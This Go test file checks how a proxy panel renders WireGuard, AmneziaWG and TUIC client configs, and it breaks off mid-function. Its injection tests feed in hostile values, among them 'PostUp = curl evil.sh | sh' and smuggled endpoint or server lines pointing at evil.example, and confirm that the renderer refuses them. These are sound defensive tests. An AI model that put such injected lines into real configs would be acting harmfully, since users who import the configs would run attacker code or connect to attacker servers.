package sub

import (
	"encoding/json"
	"fmt"
	"net/url"
	"reflect"
	"strings"
	"testing"

	"github.com/mhsanaei/3x-ui/v3/internal/amneziawg"
	"github.com/mhsanaei/3x-ui/v3/internal/database"
	"github.com/mhsanaei/3x-ui/v3/internal/database/model"
	"github.com/mhsanaei/3x-ui/v3/internal/tuic"
	"github.com/mhsanaei/3x-ui/v3/internal/web/service"
)

const (
	panelListen = "203.0.113.5"
	// panelWGSecret's public key is Y6vlHb+0ujCTj6kHEOfHFCUli9xAUieBOIcbxdq3bXQ=.
	panelWGSecret = "QDyDgmCYbwJ1DG0nMa4aNYl0Lnk0pNlC/ORvWI5bZ1g="
	panelTUICUUID = "0f8fad5b-d9cb-469f-a165-70867728950e"
)

// seedPanelInbound stores ib as this panel's own, enabled inbound.
func seedPanelInbound(t *testing.T, ib *model.Inbound) *model.Inbound {
	t.Helper()
	ib.UserId, ib.Enable, ib.Sniffing = 1, true, "{}"
	if ib.StreamSettings == "" {
		ib.StreamSettings = "{}"
	}
	if err := database.GetDB().Create(ib).Error; err != nil {
		t.Fatalf("inbound %s: %v", ib.Tag, err)
	}
	return ib
}

// seedPanelClient stores rec and attaches it to inbounds.
func seedPanelClient(t *testing.T, rec *model.ClientRecord, inbounds ...*model.Inbound) {
	t.Helper()
	rec.Enable = true
	db := database.GetDB()
	if err := db.Create(rec).Error; err != nil {
		t.Fatalf("client %s: %v", rec.Email, err)
	}
	for _, ib := range inbounds {
		if err := db.Create(&model.ClientInbound{ClientId: rec.Id, InboundId: ib.Id}).Error; err != nil {
			t.Fatalf("attach %s: %v", rec.Email, err)
		}
	}
}

// reloaded are fresh copies of inbounds, as the panel's service hands them over.
func reloaded(t *testing.T, inbounds ...*model.Inbound) []*model.Inbound {
	t.Helper()
	out := make([]*model.Inbound, 0, len(inbounds))
	for _, ib := range inbounds {
		var fresh model.Inbound
		if err := database.GetDB().First(&fresh, ib.Id).Error; err != nil {
			t.Fatalf("reload %d: %v", ib.Id, err)
		}
		out = append(out, &fresh)
	}
	return out
}

func noCountryLabel(t *testing.T) {
	t.Helper()
	old := localCountryLabel
	localCountryLabel = func() string { return "" }
	t.Cleanup(func() { localCountryLabel = old })
}

// The clients page built these configs in the browser. Each text below is what
// those builders gave for the same data, captured once: none is regenerated.
func TestTunnelConfigsKeepTheClientsPageText(t *testing.T) {
	seedSubDB(t)
	noCountryLabel(t)
	wgMain := seedPanelInbound(t, &model.Inbound{
		Tag: "wg-51820", Remark: "WG Main", Protocol: model.WireGuard, Port: 51820, Listen: panelListen,
		Settings: fmt.Sprintf(`{"secretKey":%q,"mtu":1380,"dns":"9.9.9.9","clients":[{"email":"alice",`+
			`"privateKey":"aliceWgPrivateKeyAAAAAAAAAAAAAAAAAAAAAAAAA=","allowedIPs":["10.0.0.7/32"],`+
			`"preSharedKey":"alicePresharedKeyAAAAAAAAAAAAAAAAAAAAAAAAA=","keepAlive":25}]}`, panelWGSecret),
	})
	wgHosts := seedPanelInbound(t, &model.Inbound{
		Tag: "wg-2", Protocol: model.WireGuard, Port: 51821, Listen: panelListen,
		Settings: fmt.Sprintf(`{"secretKey":%q,"clients":[{"email":"bob",`+
			`"privateKey":"bobWgPrivateKeyAAAAAAAAAAAAAAAAAAAAAAAAAAA=","allowedIPs":["10.0.0.3/32"]}]}`, panelWGSecret),
	})
	seedHost(t, &model.Host{InboundId: wgHosts.Id, SortOrder: 1, Remark: "CDN", Address: "cdn1.example.com", Port: 443})
	seedHost(t, &model.Host{InboundId: wgHosts.Id, SortOrder: 2, Remark: "Inherit"})
	awg := seedPanelInbound(t, &model.Inbound{
		Tag: "awg", Remark: "AWG", Protocol: model.AmneziaWG, Port: 51900, Listen: panelListen,
		Settings: `{"server":{"publicKey":"awgServerPublicKeyAAAAAAAAAAAAAAAAAAAAAAAA=","primaryDns":"1.1.1.1",` +
			`"secondaryDns":"  ","jc":4,"jmin":40,"jmax":70,"s1":15,"s2":25,"s3":0,"s4":12,"h1":"",` +
			`"h2":"123456-123500","h3":"","h4":"","i1":"<b 0xf6ab>","headerProtectionKey":"hpk=",` +
			`"rekeyAfterTime":"120","randomTrailers":true,"disableCookies":false},"clients":[{"email":"carol",` +
			`"privateKey":"carolAwgPrivateKeyAAAAAAAAAAAAAAAAAAAAAAAA=","allowedIPs":["10.8.1.9/32"],` +
			`"preSharedKey":"carolPresharedKeyAAAAAAAAAAAAAAAAAAAAAAAAA="}]}`,
	})
	tuicClient := fmt.Sprintf(`{"uuid":%q,"password":"p\"w#1 x","email":"dave"}`, panelTUICUUID)
	tuicHosts := seedPanelInbound(t, &model.Inbound{
		Tag: "tuic", Remark: "TUIC", Protocol: model.TUIC, Port: 8443, Listen: panelListen,
		Settings: `{"congestion_control":"cubic","alpn":["h3","h2"],"udp_relay_mode":"quic",` +
			`"zero_rtt_handshake":false,"clients":[` + tuicClient + `]}`,
	})
	seedHost(t, &model.Host{
		InboundId: tuicHosts.Id, SortOrder: 1, Remark: "Edge", Address: "tuic.example.com", Port: 9443,
		Sni: "sni.example.com", Alpn: []string{"h3"}, AllowInsecure: true,
	})
	seedHost(t, &model.Host{
		InboundId: tuicHosts.Id, SortOrder: 2, Remark: "RawOnly", Address: "raw.example.com", Port: 9443,
		ExcludeFromSubTypes: []string{"clash"},
	})
	tuicPlain := seedPanelInbound(t, &model.Inbound{
		Tag: "tuic-2", Remark: "T2", Protocol: model.TUIC, Port: 8444, Listen: panelListen,
		Settings: `{"clients":[` + tuicClient + `]}`,
	})
	// The shared columns hold another tunnel's address; each inbound keeps its own.
	seedPanelClient(t, &model.ClientRecord{
		Email: "alice", Comment: "desk pc", PrivateKey: "aliceWgPrivateKeyAAAAAAAAAAAAAAAAAAAAAAAAA=",
		AllowedIPs: "10.0.0.2/32", PreSharedKey: "alicePresharedKeyAAAAAAAAAAAAAAAAAAAAAAAAA=", KeepAlive: "25",
	}, wgMain)
	seedPanelClient(t, &model.ClientRecord{
		Email: "bob", PrivateKey: "bobWgPrivateKeyAAAAAAAAAAAAAAAAAAAAAAAAAAA=", AllowedIPs: "10.0.0.3/32",
	}, wgHosts)
	seedPanelClient(t, &model.ClientRecord{
		Email: "carol", Comment: "phone", PrivateKey: "carolAwgPrivateKeyAAAAAAAAAAAAAAAAAAAAAAAA=",
		AllowedIPs: "10.0.0.2/32", PreSharedKey: "carolPresharedKeyAAAAAAAAAAAAAAAAAAAAAAAAA=",
	}, awg)
	seedPanelClient(t, &model.ClientRecord{Email: "dave", Comment: "tablet", UUID: panelTUICUUID, Password: `p"w#1 x`}, tuicHosts, tuicPlain)

	for _, tc := range []struct {
		email    string
		inbounds []*model.Inbound
		want     []service.TunnelConfig
	}{
		{"alice", []*model.Inbound{wgMain}, []service.TunnelConfig{{
			InboundId: wgMain.Id, Protocol: "wireguard", Email: "alice", Address: panelListen, Port: 51820,
			Remark: "WG Main - alice - desk pc",
			Text: `[Interface]
PrivateKey = aliceWgPrivateKeyAAAAAAAAAAAAAAAAAAAAAAAAA=
Address = 10.0.0.7/32
DNS = 9.9.9.9
MTU = 1380

# WG Main - alice - desk pc
[Peer]
PublicKey = Y6vlHb+0ujCTj6kHEOfHFCUli9xAUieBOIcbxdq3bXQ=
PresharedKey = alicePresharedKeyAAAAAAAAAAAAAAAAAAAAAAAAA=
AllowedIPs = 0.0.0.0/0, ::/0
Endpoint = 203.0.113.5:51820
PersistentKeepalive = 25`,
		}}},
		{"bob", []*model.Inbound{wgHosts}, []service.TunnelConfig{{
			InboundId: wgHosts.Id, Protocol: "wireguard", Email: "bob", Address: "cdn1.example.com", Port: 443,
			Endpoint: "cdn1.example.com:443", Remark: "wg-2 - CDN - bob",
			Text: `[Interface]
PrivateKey = bobWgPrivateKeyAAAAAAAAAAAAAAAAAAAAAAAAAAA=
Address = 10.0.0.3/32
DNS = 1.1.1.1, 1.0.0.1

# wg-2 - CDN - bob
[Peer]
PublicKey = Y6vlHb+0ujCTj6kHEOfHFCUli9xAUieBOIcbxdq3bXQ=
AllowedIPs = 0.0.0.0/0, ::/0
Endpoint = cdn1.example.com:443`,
		}, {
			InboundId: wgHosts.Id, Protocol: "wireguard", Email: "bob", Address: panelListen, Port: 51821,
			Endpoint: "203.0.113.5:51821", Remark: "wg-2 - Inherit - bob",
			Text: `[Interface]
PrivateKey = bobWgPrivateKeyAAAAAAAAAAAAAAAAAAAAAAAAAAA=
Address = 10.0.0.3/32
DNS = 1.1.1.1, 1.0.0.1

# wg-2 - Inherit - bob
[Peer]
PublicKey = Y6vlHb+0ujCTj6kHEOfHFCUli9xAUieBOIcbxdq3bXQ=
AllowedIPs = 0.0.0.0/0, ::/0
Endpoint = 203.0.113.5:51821`,
		}}},
		{"carol", []*model.Inbound{awg}, []service.TunnelConfig{{
			InboundId: awg.Id, Protocol: "amneziawg", Email: "carol", Address: panelListen, Port: 51900,
			Remark: "AWG - carol - phone",
			Text: `[Interface]
PrivateKey = carolAwgPrivateKeyAAAAAAAAAAAAAAAAAAAAAAAA=
Address = 10.8.1.9/32
DNS = 1.1.1.1
MTU = 1408
Jc = 4
Jmin = 40
Jmax = 70
S1 = 15
S2 = 25
S4 = 12
H1 = 1
H2 = 123456-123500
H3 = 3
H4 = 4
I1 = <b 0xf6ab>
HeaderProtectionKey = hpk=
RekeyAfterTime = 120
RandomTrailers = on

# AWG - carol - phone
[Peer]
PublicKey = awgServerPublicKeyAAAAAAAAAAAAAAAAAAAAAAAA=
PresharedKey = carolPresharedKeyAAAAAAAAAAAAAAAAAAAAAAAAA=
AllowedIPs = 0.0.0.0/0, ::/0
Endpoint = 203.0.113.5:51900`,
		}}},
		{"dave", []*model.Inbound{tuicHosts, tuicPlain}, []service.TunnelConfig{{
			InboundId: tuicHosts.Id, Protocol: "tuic", Email: "dave", Address: "tuic.example.com", Port: 9443,
			Endpoint: "tuic.example.com:9443", Remark: "TUIC - Edge - dave",
			Text: `# TUIC v5 Client Configuration (Clash / Mihomo / Clash Verge)
# TUIC - Edge - dave
proxies:
  - name: "TUIC - Edge - dave"
    type: tuic
    server: tuic.example.com
    port: 9443
    uuid: 0f8fad5b-d9cb-469f-a165-70867728950e
    password: "p\"w#1 x"
    alpn:
      - h3
    sni: sni.example.com
    congestion-controller: cubic
    udp-relay-mode: quic
    reduce-rtt: false
    skip-cert-verify: true`,
		}, {
			InboundId: tuicPlain.Id, Protocol: "tuic", Email: "dave", Address: panelListen, Port: 8444,
			Remark: "T2 - dave",
			Text: `# TUIC v5 Client Configuration (Clash / Mihomo / Clash Verge)
# T2 - dave
proxies:
  - name: "T2 - dave"
    type: tuic
    server: 203.0.113.5
    port: 8444
    uuid: 0f8fad5b-d9cb-469f-a165-70867728950e
    password: "p\"w#1 x"
    alpn:
      - h3
      - spdy/3.1
    sni: 203.0.113.5
    congestion-controller: bbr
    udp-relay-mode: native
    reduce-rtt: true`,
		}}},
	} {
		t.Run(tc.email, func(t *testing.T) {
			got := NewLinkProvider().TunnelConfigsForClient("panel.example.com", reloaded(t, tc.inbounds...), tc.email)
			if !reflect.DeepEqual(got, tc.want) {
				t.Fatalf("configs\n got: %#v\nwant: %#v", got, tc.want)
			}
		})
	}
}

// panelFrontWG is a WireGuard customer behind the test front, sent to address.
func panelFrontWG(t *testing.T, address string) *model.Inbound {
	t.Helper()
	priv, _ := mustWireguardKeypair(t)
	ib := seedPanelInbound(t, &model.Inbound{
		Tag: "wg", Protocol: model.WireGuard, Port: 51820, ShareAddrStrategy: "custom", ShareAddr: address,
		Settings: fmt.Sprintf(`{"secretKey":%q,"clients":[{"email":"user","privateKey":%q,"allowedIPs":["10.0.0.2/32"]}]}`, panelWGSecret, priv),
	})
	seedPanelClient(t, &model.ClientRecord{Email: "user", PrivateKey: priv, AllowedIPs: "10.0.0.2/32"}, ib)
	return ib
}

// frontConfig is how a config behind a front differs from its siblings.
type frontConfig struct{ family, address, endpoint, remark, dials string }

func frontConfigsOf(t *testing.T, configs []service.TunnelConfig) []frontConfig {
	t.Helper()
	var out []frontConfig
	for _, c := range configs {
		dials, _ := confValue(c.Text, "Endpoint = ")
		if comment, _ := confValue(c.Text, "# "); comment != c.Remark {
			t.Fatalf("the .conf is named %q, the config %q", comment, c.Remark)
		}
		out = append(out, frontConfig{c.Family, c.Address, c.Endpoint, c.Remark, dials})
	}
	return out
}

// confValue is what follows prefix on the first line that starts with it.
func confValue(text, prefix string) (string, bool) {
	for line := range strings.SplitSeq(text, "\n") {
		if v, ok := strings.CutPrefix(line, prefix); ok {
			return v, true
		}
	}
	return "", false
}

// Behind an entry server handing out IPv6 the panel's configs are the
// subscription's: the IPv6 one alone, or IPv6 then IPv4 named by subRemarkIPFamily.
func TestTunnelConfigsFollowAnIPv6Front(t *testing.T) {
	v6 := "[" + testFrontIPv6 + "]"
	// "v6"/"v4" are spelled out: the panel's IPv6/IPv4 tags match these very strings.
	v6Config := func(remark string) frontConfig {
		return frontConfig{"v6", v6, v6 + ":51820", remark, v6 + ":51820"}
	}
	v4Config := func(remark string) frontConfig {
		return frontConfig{"v4", testFrontName, testFrontName + ":51820", remark, testFrontName + ":51820"}
	}
	for _, tc := range []struct {
		name, family, mode string
		want               []frontConfig
	}{
		{"v6", "v6", "", []frontConfig{v6Config("wg - user")}},
		{"both", "both", "version", []frontConfig{v6Config("wg - user · IPv6"), v4Config("wg - user · IPv4")}},
		{"both numbered", "both", "number", []frontConfig{v6Config("wg - user 1"), v4Config("wg - user 2")}},
		{"both unmarked", "both", "off", []frontConfig{v6Config("wg - user"), v4Config("wg - user")}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			seedSubDB(t)
			noCountryLabel(t)
			ib := panelFrontWG(t, testFrontName)
			seedFront(t, "front", tc.family)
			if tc.mode != "" {
				setRemarkIPFamily(t, tc.mode)
			}
			got := frontConfigsOf(t, NewLinkProvider().TunnelConfigsForClient("panel.example.com", reloaded(t, ib), "user"))
			if !reflect.DeepEqual(got, tc.want) {
				t.Fatalf("configs\n got: %+v\nwant: %+v", got, tc.want)
			}
		})
	}
}

// A host that inherits the front's address gets its pair in place; a host
// elsewhere keeps the one config it always had.
func TestTunnelConfigsPairEachHostNamingTheFront(t *testing.T) {
	seedSubDB(t)
	noCountryLabel(t)
	ib := panelFrontWG(t, testFrontName)
	seedHost(t, &model.Host{InboundId: ib.Id, SortOrder: 1, Remark: "A"})
	seedHost(t, &model.Host{InboundId: ib.Id, SortOrder: 2, Remark: "CDN", Address: "cdn.example.com", Port: 8443})
	seedFront(t, "front", "both")

	v6 := "[" + testFrontIPv6 + "]"
	want := []frontConfig{
		{"v6", v6, v6 + ":51820", "wg - A - user · IPv6", v6 + ":51820"},
		{"v4", testFrontName, testFrontName + ":51820", "wg - A - user · IPv4", testFrontName + ":51820"},
		{"", "cdn.example.com", "cdn.example.com:8443", "wg - CDN - user", "cdn.example.com:8443"},
	}
	got := frontConfigsOf(t, NewLinkProvider().TunnelConfigsForClient("panel.example.com", reloaded(t, ib), "user"))
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("configs\n got: %+v\nwant: %+v", got, want)
	}
}

// A TUIC config behind the front sends the front's name as SNI, never an IPv6
// literal: Iran drops a ClientHello without a name, and YAML reads [..] as a list.
func TestTunnelConfigsTUICBehindAFrontKeepAName(t *testing.T) {
	for _, tc := range []struct {
		name, shareAddr, name6 string
		server, sni            string
	}{
		{"named front", testFrontName, "", `"` + testFrontIPv6 + `"`, testFrontName},
		{"bare front", testFrontIPv4, "", `"` + testFrontIPv6 + `"`, ""},
		{"IPv6 name", testFrontIPv4, testFrontName6, testFrontName6, testFrontName6},
	} {
		t.Run(tc.name, func(t *testing.T) {
			seedSubDB(t)
			noCountryLabel(t)
			ib := seedPanelInbound(t, &model.Inbound{
				Tag: "tuic", Protocol: model.TUIC, Port: 8443, ShareAddrStrategy: "custom", ShareAddr: tc.shareAddr,
				Settings: fmt.Sprintf(`{"clients":[{"uuid":%q,"password":"pw","email":"user"}]}`, panelTUICUUID),
			})
			seedPanelClient(t, &model.ClientRecord{Email: "user", UUID: panelTUICUUID, Password: "pw"}, ib)
			front := testFront("v6")
			front.Name, front.KeyPath, front.Status, front.PublicName6 = "front", "/k/front", "ready", tc.name6
			if err := database.GetDB().Create(&front).Error; err != nil {
				t.Fatalf("front: %v", err)
			}

			configs := NewLinkProvider().TunnelConfigsForClient("panel.example.com", reloaded(t, ib), "user")
			if len(configs) != 1 || configs[0].Family != "v6" {
				t.Fatalf("configs = %+v, want the IPv6 one alone", configs)
			}
			server, _ := confValue(configs[0].Text, "    server: ")
			sni, hasSNI := confValue(configs[0].Text, "    sni: ")
			if server != tc.server || sni != tc.sni || hasSNI != (tc.sni != "") {
				t.Fatalf("server %q, sni %q (written %v); want %q and %q\n%s", server, sni, hasSNI, tc.server, tc.sni, configs[0].Text)
			}
		})
	}
}

// Moving the configs to the backend changed one IPv4 case on purpose: with no address
// of its own a config dials where its subscription link does, not the browser's host.
func TestTunnelConfigsWithNoAddressDialWhereTheirLinkDoes(t *testing.T) {
	for _, tc := range []struct {
		name     string
		settings map[string]string
		want     string
	}{
		{"subscription domain", map[string]string{"subDomain": "sub.example.com"}, "sub.example.com:51820"},
		{"panel domain", map[string]string{"subDomain": "sub.example.com", "webDomain": "web.example.com"}, "web.example.com:51820"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			seedSubDB(t)
			noCountryLabel(t)
			for key, value := range tc.settings {
				saveSetting(t, key, value)
			}
			ib := seedPanelInbound(t, &model.Inbound{
				Tag: "wg", Protocol: model.WireGuard, Port: 51820,
				Settings: fmt.Sprintf(`{"secretKey":%q,"clients":[{"email":"user","privateKey":"userKey==","allowedIPs":["10.0.0.2/32"]}]}`, panelWGSecret),
			})
			seedPanelClient(t, &model.ClientRecord{Email: "user", PrivateKey: "userKey==", AllowedIPs: "10.0.0.2/32"}, ib)
			provider := NewLinkProvider()

			configs := provider.TunnelConfigsForClient("panel.example.com", reloaded(t, ib), "user")
			if len(configs) != 1 {
				t.Fatalf("configs = %+v, want one", configs)
			}
			dials, _ := confValue(configs[0].Text, "Endpoint = ")
			links := provider.LinksForClient("panel.example.com", reloaded(t, ib)[0], "user")
			if len(links) != 1 {
				t.Fatalf("links = %q, want one", links)
			}
			link, err := url.Parse(links[0])
			if err != nil {
				t.Fatalf("link %q: %v", links[0], err)
			}
			if dials != tc.want || link.Host != tc.want {
				t.Fatalf("the .conf dials %q and the link %q, want both %q", dials, link.Host, tc.want)
			}
		})
	}
}

// Hosts naming one front all dial its IPv6 address. The windows label and name a
// download by endpoint, so each one's says which host it is, by remark or by order.
func TestTunnelConfigsBehindAFrontKeepDistinctEndpoints(t *testing.T) {
	seedSubDB(t)
	noCountryLabel(t)
	ib := seedPanelInbound(t, &model.Inbound{
		Tag: "tuic", Protocol: model.TUIC, Port: 8443, ShareAddrStrategy: "custom", ShareAddr: testFrontName,
		Settings: fmt.Sprintf(`{"clients":[{"uuid":%q,"password":"pw","email":"user"}]}`, panelTUICUUID),
	})
	seedPanelClient(t, &model.ClientRecord{Email: "user", UUID: panelTUICUUID, Password: "pw"}, ib)
	seedHost(t, &model.Host{InboundId: ib.Id, SortOrder: 1, Remark: "A", Address: testFrontName, Sni: "a.example.com"})
	seedHost(t, &model.Host{InboundId: ib.Id, SortOrder: 2, Remark: "B", Address: testFrontIPv4, Sni: "b.example.com"})
	seedHost(t, &model.Host{InboundId: ib.Id, SortOrder: 3, Remark: "B", Address: testFrontName, Sni: "c.example.com"})
	seedHost(t, &model.Host{InboundId: ib.Id, SortOrder: 4, Remark: "CDN", Address: "cdn.example.com", Port: 443})
	seedFront(t, "front", "v6")

	v6 := "[" + testFrontIPv6 + "]:8443"
	want := [][2]string{
		{v6 + " (A)", "a.example.com"},
		{v6 + " (B) #1", "b.example.com"},
		{v6 + " (B) #2", "c.example.com"},
		{"cdn.example.com:443", "cdn.example.com"},
	}
	var got [][2]string
	for _, c := range NewLinkProvider().TunnelConfigsForClient("panel.example.com", reloaded(t, ib), "user") {
		sni, _ := confValue(c.Text, "    sni: ")
		got = append(got, [2]string{c.Endpoint, sni})
	}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("endpoints and SNIs\n got: %q\nwant: %q", got, want)
	}
}

// A field landing unescaped in [Interface] with a newline would inject a config
// line, a rogue PostUp, into the .conf a customer imports.
func TestWireguardPanelConfRefusesAnInjectedLine(t *testing.T) {
	const injected = "x\nPostUp = curl evil.sh | sh"
	clean := func() (model.Client, string, string) {
		return model.Client{Email: "peer-1", PrivateKey: "clientPrivKey==", PreSharedKey: "psk==", AllowedIPs: []string{"10.0.0.2/32"}},
			"9.9.9.9", "wg - peer-1"
	}
	if c, dns, remark := clean(); !strings.Contains(wireguardPanelConf(c, "serverPubKey==", 0, dns, "wg.example.test:51820", remark), "PresharedKey = psk==") {
		t.Fatal("a clean config does not render")
	}
	for name, inject := range map[string]func(*model.Client, *string, *string){
		"private key":   func(c *model.Client, _, _ *string) { c.PrivateKey = injected },
		"preshared key": func(c *model.Client, _, _ *string) { c.PreSharedKey = "psk==\rEndpoint = evil.example:51820" },
		"DNS":           func(_ *model.Client, dns, _ *string) { *dns = injected },
		"remark":        func(_ *model.Client, _, remark *string) { *remark = injected },
	} {
		t.Run(name, func(t *testing.T) {
			c, dns, remark := clean()
			inject(&c, &dns, &remark)
			if conf := wireguardPanelConf(c, "serverPubKey==", 0, dns, "wg.example.test:51820", remark); conf != "" {
				t.Fatalf("rendered an injected %s:\n%s", name, conf)
			}
		})
	}

	// Any admin who edits the client sets its comment, which reaches the remark.
	seedSubDB(t)
	noCountryLabel(t)
	ib := seedPanelInbound(t, &model.Inbound{
		Tag: "wg", Protocol: model.WireGuard, Port: 51820, Listen: panelListen,
		Settings: fmt.Sprintf(`{"secretKey":%q,"clients":[{"email":"peer-1","privateKey":"clientPrivKey=="}]}`, panelWGSecret),
	})
	seedPanelClient(t, &model.ClientRecord{Email: "peer-1", Comment: injected, PrivateKey: "clientPrivKey=="}, ib)
	if configs := NewLinkProvider().TunnelConfigsForClient("panel.example.com", reloaded(t, ib), "peer-1"); len(configs) != 0 {
		t.Fatalf("an injected comment still gave configs: %+v", configs)
	}
}

// The YAML's comment and uuid lines are written bare; a newline in either would
// add keys, a server or skip-cert-verify, to the proxy a customer imports.
func TestTUICPanelYAMLRefusesAnInjectedLine(t *testing.T) {
	inst, ok := tuic.InstanceFromInbound(&model.Inbound{Protocol: model.TUIC, Port: 8443, Settings: `{"clients":[]}`})
	if !ok {
		t.Fatal("no TUIC instance")
	}
	target := tunnelTarget{address: "tuic.example.test", port: 8443}
	clean := model.Client{Email: "user", ID: panelTUICUUID, Password: "pw"}
	if !strings.Contains(tuicPanelYAML(inst, target, clean, "tuic - user"), "uuid: "+panelTUICUUID) {
		t.Fatal("a clean config does not render")
	}
	for name, tc := range map[string]struct {
		client model.Client
		remark string
	}{
		"remark": {clean, "tuic - user\n    skip-cert-verify: true"},
		"uuid":   {model.Client{Email: "user", ID: panelTUICUUID + "\r\n    server: evil.example", Password: "pw"}, "tuic - user"},
	} {
		t.Run(name, func(t *testing.T) {
			if yaml := tuicPanelYAML(inst, target, tc.client, tc.remark); yaml != "" {
				t.Fatalf("rendered an injected %s:\n%s", name, yaml)
			}
		})
	}
}

// A field landing unescaped in [Interface] with a newline would inject a config
// line, a rogue PostUp, into the .conf a customer imports.
func TestAmneziaWGPanelConfRefusesAnInjectedLine(t *testing.T) {
	const injected = "x\nPostUp = curl evil.sh | sh"
	clean := func() (*amneziawg.ServerSettings, model.Client, string) {
		return &amneziawg.ServerSettings{PublicKey: "serverPubKey==", Jc: 4, Jmin: 40, Jmax: 100, S1: 30, S2: 90},
			model.Client{Email: "peer-1", PrivateKey: "clientPrivKey==", AllowedIPs: []string{"10.8.1.2/32"}}, "awg - peer-1"
	}
	if server, client, remark := clean(); !strings.Contains(amneziaWGPanelConf(server, client, "awg.example.test:51820", remark), "PrivateKey = clientPrivKey==") {
		t.Fatal("a clean config does not render")
	}
	for name, inject := range map[string]func(*amneziawg.ServerSettings, *model.Client, *string){
		"private key":   func(_ *amneziawg.ServerSettings, c *model.Client, _ *string) { c.PrivateKey = injected },
		"primary DNS":   func(s *amneziawg.ServerSettings, _ *model.Client, _ *string) { s.PrimaryDNS = injected },
		"secondary DNS": func(s *amneziawg.ServerSettings, _ *model.Client, _ *string) { s.SecondaryDNS = injected },
		"remark":        func(_ *amneziawg.ServerSettings, _ *model.Client, r *string) { *r = injected },
	} {
		t.Run(name, func(t *testing.T) {
			server, client, remark := clean()
			inject(server, &client, &remark)
			if conf := amneziaWGPanelConf(server, client, "awg.example.test:51820", remark); conf != "" {
				t.Fatalf("rendered an injected %s:\n%s", name, conf)
			}
		})
	}

	// A client's comment reaches the remark; the config is left out, not emptied.
	seedSubDB(t)
	noCountryLabel(t)
	ib := seedPanelInbound(t, &model.Inbound{
		Tag: "awg", Protocol: model.AmneziaWG, Port: 51900, Listen: panelListen,
		Settings: `{"server":{"publicKey":"serverPubKey==","jc":4},"clients":[{"email":"peer-1","privateKey":"clientPrivKey=="}]}`,
	})
	seedPanelClient(t, &model.ClientRecord{Email: "peer-1", Comment: injected, PrivateKey: "clientPrivKey=="}, ib)
	if configs := NewLinkProvider().TunnelConfigsForClient("panel.example.com", reloaded(t, ib), "peer-1"); len(configs) != 0 {
		t.Fatalf("an injected comment still gave configs: %+v", configs)
	}
}

// AmneziaWG writes a keepalive range as the vpn:// link does (#6881); WireGuard has
// no ranges, and a control character other than a break refuses either config.
func TestPanelConfsKeepaliveRangeAndControlCharacters(t *testing.T) {
	server := &amneziawg.ServerSettings{PublicKey: "serverPubKey==", Jc: 4, Jmin: 40, Jmax: 100, S1: 30, S2: 90}
	ranged := model.KeepAliveValue("25-35")
	client := model.Client{Email: "peer-1", PrivateKey: "clientPrivKey==", AllowedIPs: []string{"10.8.1.2/32"}, KeepAlive: &ranged}
	if conf := amneziaWGPanelConf(server, client, "awg.example.test:51820", "awg"); !strings.HasSuffix(conf, "\nPersistentKeepalive = 25-35") {
		t.Fatalf("AmneziaWG lost its keepalive range:\n%s", conf)
	}
	if conf := wireguardPanelConf(client, "serverPubKey==", 0, "", "wg.example.test:51820", "wg"); conf == "" || strings.Contains(conf, "PersistentKeepalive") {
		t.Fatalf("WireGuard wrote a keepalive range:\n%s", conf)
	}
	client.KeepAlive = nil
	if conf := amneziaWGPanelConf(server, client, "awg.example.test:51820", "awg\tPostUp"); conf != "" {
		t.Fatalf("rendered a remark holding a tab:\n%s", conf)
	}
}

// Without the key the tunnel needs there is nothing to import; the subscription
// leaves such a client's link out, and the panel its config.
func TestTunnelConfigsNeedTheClientsKey(t *testing.T) {
	seedSubDB(t)
	noCountryLabel(t)
	wg := seedPanelInbound(t, &model.Inbound{
		Tag: "wg", Protocol: model.WireGuard, Port: 51820, Listen: panelListen,
		Settings: fmt.Sprintf(`{"secretKey":%q,"clients":[{"email":"nokey","allowedIPs":["10.0.0.9/32"]}]}`, panelWGSecret),
	})
	tuicIb := seedPanelInbound(t, &model.Inbound{
		Tag: "tuic", Protocol: model.TUIC, Port: 8443, Listen: panelListen,
		Settings: fmt.Sprintf(`{"clients":[{"uuid":%q,"password":"pw","email":"nopass"}]}`, panelTUICUUID),
	})
	// The shared column's key is another tunnel's; this inbound's peer has none.
	seedPanelClient(t, &model.ClientRecord{Email: "nokey", PrivateKey: "otherTunnelKey==", AllowedIPs: "10.0.0.9/32"}, wg)
	seedPanelClient(t, &model.ClientRecord{Email: "nopass", UUID: panelTUICUUID}, tuicIb)

	for email, ib := range map[string]*model.Inbound{"nokey": wg, "nopass": tuicIb} {
		if configs := NewLinkProvider().TunnelConfigsForClient("panel.example.com", reloaded(t, ib), email); len(configs) != 0 {
			t.Errorf("%s got configs without its key: %+v", email, configs)
		}
	}
}

// The inbound windows read one entry per client, whose links are exactly the
// client window's, and whose configs are too.
func TestInboundClientLinksAreTheClientWindowsOwn(t *testing.T) {
	inbounds := seedFrontCustomer(t)
	seedFront(t, "front-both", "both")
	provider := NewLinkProvider()
	for _, tag := range []string{"vless", "wg"} {
		t.Run(tag, func(t *testing.T) {
			entries := provider.InboundClientLinks("sub.example.com", reloaded(t, inbounds[tag])[0], nil)
			links := provider.LinksForClient("sub.example.com", reloaded(t, inbounds[tag])[0], "user")
			configs := provider.TunnelConfigsForClient("sub.example.com", reloaded(t, inbounds[tag]), "user")
			if configs == nil {
				configs = []service.TunnelConfig{}
			}
			if len(links) < 2 {
				t.Fatalf("the front gives %s no pair to compare: %q", tag, links)
			}
			want := []service.InboundClientLinks{{Email: "user", Links: links, Configs: configs}}
			if !reflect.DeepEqual(entries, want) {
				t.Fatalf("entries\n got: %#v\nwant: %#v", entries, want)
			}
		})
	}
}

// Entries follow the inbound's settings, a client listed twice once; asked for
// some emails, the rest stay out. Neither list is ever null to the browser.
func TestInboundClientLinksOrderAndFilter(t *testing.T) {
	seedSubDB(t)
	noCountryLabel(t)
	ib := seedPanelInbound(t, &model.Inbound{
		Tag: "wg", Protocol: model.WireGuard, Port: 51820, Listen: panelListen,
		Settings: fmt.Sprintf(`{"secretKey":%q,"clients":[{"email":"zed","allowedIPs":["10.0.0.5/32"]},`+
			`{"email":"amy","privateKey":"amyKey==","allowedIPs":["10.0.0.4/32"]},{"email":"ZED"}]}`, panelWGSecret),
	})
	// The shared column holds amy's address on another tunnel, as in the parity test.
	seedPanelClient(t, &model.ClientRecord{Email: "amy", PrivateKey: "amyKey==", AllowedIPs: "10.0.0.2/32"}, ib)
	seedPanelClient(t, &model.ClientRecord{Email: "zed", AllowedIPs: "10.0.0.5/32"}, ib)
	provider := NewLinkProvider()

	emailsOf := func(entries []service.InboundClientLinks) []string {
		var out []string
